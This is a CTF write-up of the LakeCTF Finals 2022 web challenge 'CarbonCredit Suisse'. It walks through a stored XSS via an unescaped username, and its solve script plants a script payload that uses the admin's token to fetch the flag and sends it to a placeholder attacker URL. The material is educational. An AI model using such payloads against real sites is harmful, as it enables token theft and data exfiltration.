---
author: "deveshl"
title: "[LakeCTF Finals 2022] CarbonCredit Suisse"
date: "2022-11-09"
description: "LakeCTF Finals 2022: CarbonCredit Suisse (Web) writeup"
tags: ["writeups", "ctf", "web"]
ShowBreadcrumbs: False
---

# CarbonCredit Suisse
This was a web challenge from the LakeCTF finals held in Lausanne, Switzerland that I solved together with [Junhua](https://jh123x.com/). This ended up being a fairly straightforward XSS challenge with some additional annoyances to keep people on their toes.

## Challenge Description
```
Schmidt Sàrl don't think you can break into their web app in under a minute. Can you?
http://chall.polygl0ts.ch:4100
```

## Analysis

A Docker container was provided with the challenge, containing the source code to the running instance of the webapp. A mirror is available [here](https://github.com/deveshl/writeup/blob/main/carboncredit-suisse.zip).

Essentially, each time a user accesses the application root, a new "instance" is generated containing a new set of application data, and all requests are expected to be sent to the instance. After the instance is created, a Puppeteer script visits the instance and logs in with admin credentials three times in 30 second intervals, before logging in once more to delete the instance.

```python
HASHED_ADMIN_PASSWORD = os.getenv('HASHED_ADMIN_PASSWORD')
FLAG = os.getenv("FLAG")

SECRET_KEY = secrets.token_hex(32)
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30


fake_dbs = {}


def init_instance(instance):
    fake_dbs[instance] = {
        "instance": instance,
        "users": {
            "admin": {
                "username": "admin",
                "full_name": "Administrator",
                "email": "admin@epfl.ch",
                "hashed_password": HASHED_ADMIN_PASSWORD,
                "disabled": False,
                "admin": True,
            },
        },
        "lines": [
            {
                "creator_username": "admin",
                "description": "Toilet Paper",
                "amount": Decimal("34.555"),
            },
        ],
    }


def destroy_instance(instance):
    del fake_dbs[instance]
    
# ...
@app.get("/")
@app.get("/index.html")
async def index():
    instance = secrets.token_urlsafe()
    init_instance(instance)
    q.enqueue(bot.visit, instance)
    return RedirectResponse(f"/{instance}/index.html")
```

```python
async def visit(instance):
    from pyppeteer import launch
    import asyncio
    import os

    ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

    url = f"http://carboncredit-suisse:8000/{instance}/"
    print("Visiting", url)
    browser = await launch({"args": ["--no-sandbox", "--disable-setuid-sandbox"]})
    # while True:
    for _ in range(2):
        await asyncio.sleep(10)
        page = await browser.newPage()
        await page.goto(url)
        await page.click("#login")
        await page.type("#login_username", "admin")
        await page.type("#login_password", ADMIN_PASSWORD)
        await page.click("#login_submit")

    print("Time's up, destroying challenge!")
    await page.goto(url)
    await page.click("#login")
    await page.type("#login_username", "admin")
    await page.type("#login_password", ADMIN_PASSWORD)
    await page.click("#login_submit")
    await asyncio.sleep(1)
    await page.click("#dashboard_destroy") # this calls destroy_instance in the main file
    await browser.close()
```

Within the instance, users can sign up, log in, and create lines of text (I suppose these are the "carbon credits"?)

```python
@app.post("/{instance}/register")
async def register(
    db=Depends(get_db),
    username: str = Form(),
    full_name: str = Form(),
    email: EmailStr = Form(),
    password: str = Form(),
):
    if username in db:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Username is already taken",
        )
    db["users"][username] = {
        "username": username,
        "full_name": full_name,
        "email": email,
        "hashed_password": get_password_hash(password),
        "disabled": False,
        "admin": False,
    }
    
# ...

@app.post("/{instance}/lines/add")
async def lines_add(
    db=Depends(get_db),
    description: str = Form(),
    amount: Decimal = Form(),
    current_user: User = Depends(get_current_active_user),
):
    add_line(
        db,
        Line(
            description=html.escape(description),
            amount=amount,
            creator_username=current_user.username,
        ),
    )
```

The code for displaying the lines:

```python
@app.get("/{instance}/lines/display")
async def lines_display(
    db=Depends(get_db), current_user: User = Depends(get_current_active_user)
):
    response = "<div>"
    for line in get_all_lines(db):
        response += f"<p>{line.amount} | {line.description} | {line.creator_username}"
    return response
```

Immediately we can see that there's a problem here: though the description is filtered before being stored in the database, the username of the user adding the line is not, and there are no checks done at user creation time to ensure that the username is safe to display. This means that we can create a user with a username that contains HTML, and then add a line with that user. When the admin visits the instance, the username will render as HTML, and we can use this to perform XSS.

Our goal is to get the flag:
```python
@app.get("/{instance}/flag")
async def flag(
    response: Response, current_user: User = Depends(get_current_active_user)
):
    response.headers["Access-Control-Allow-Origin"] = "127.0.0.1"
    if current_user.admin:
        return FLAG
    else:
        return "EPFL{404_F1ag_n0t_Found}"
```

So not only does the request have to come from the same origin as the server, but the user must be authenticated as an admin. How is user authentication performed? We could look at the rest of the Python server code, but it's much easier to just look at the JavaScript code that's sent to the browser:

```javascript
  var access_token = null;
  $(document).ready(function () {
      // ...
      $("#login_form").submit(function (e) {
          e.preventDefault();
          $.post(
              "token",
              {
                  username: $("#login_username").val(),
                  password: $("#login_password").val(),
              },
              function (data, status) {
                  if (status === "success") {
                      access_token = data.access_token;
                  }
                  $("#login_screen").hide();
                  $("#dashboard").show();
                  $.ajax({
                      url: "lines/display",
                      headers: {
                          Authorization: "Bearer " + access_token,
                      },
                      success: function (data, status) {
                          if (status === "success") {
                              $("#dashboard_lines").html(data);
                          }
                      },
                  });
              }
          );
      });
  });
```

So it sends the username and password to the `/token` endpoint and stores the received access token in a global variable. Conveniently, the access token is stored in a global variable, so we can access it from our XSS payload easily. We just need to send a request to `/flag` like so:

```javascript
fetch("flag", {
    headers: {
        "Authorization": "Bearer " + access_token
    }
}).then(r => r.text()).then(flag => do_something(flag))
```

## Solution

Our final solve script looks like this. It creates a user with our XSS payload, gets an access token for that user, and adds a new line. When our admin visits the instance, it will trigger the payload, which makes an authenticated request to `/flag` and then redirects to our server with the response contents in the URL.

```python
import requests

username = r"""<script>fetch("flag",{headers:{"Authorization":"Bearer "+access_token}}).then(r=>r.text()).then(flag=>window.location.replace("https://<attacker_url>/?flag="+flag))</script>"""

url = "http://chall.polygl0ts.ch:4100"
password = "test"

with requests.Session() as s:
    resp = s.get(url)
    id = resp.url.split('/')[3]
    NEW_URL = f"{url}/{id}"
    print(f"Instance: {id}")
    resp = s.post(NEW_URL + '/register', data={
        'username': username,
        'password': password,
        'full_name': 'full_name',
        'email': 'email@email.com',
    })
    print(f"Registering {resp.status_code}: {resp.text}")

    resp = s.post(NEW_URL + '/token', data={
        'username': username,
        'password': password,
    })

    print(f"Getting token {resp.status_code}")

    access_token = resp.json()['access_token']    

    resp = s.post(NEW_URL + '/lines/add', data={
        'description': 'description',
        'amount': 100,
    }, headers={
        "Authorization": f"Bearer {access_token}",
    })

    print(f"Upload {resp.status_code}: {resp.text}")
```

## Flag
```EPFL{C1e4n_h4nd5_l3av3_n0_f1n9erprIn7}```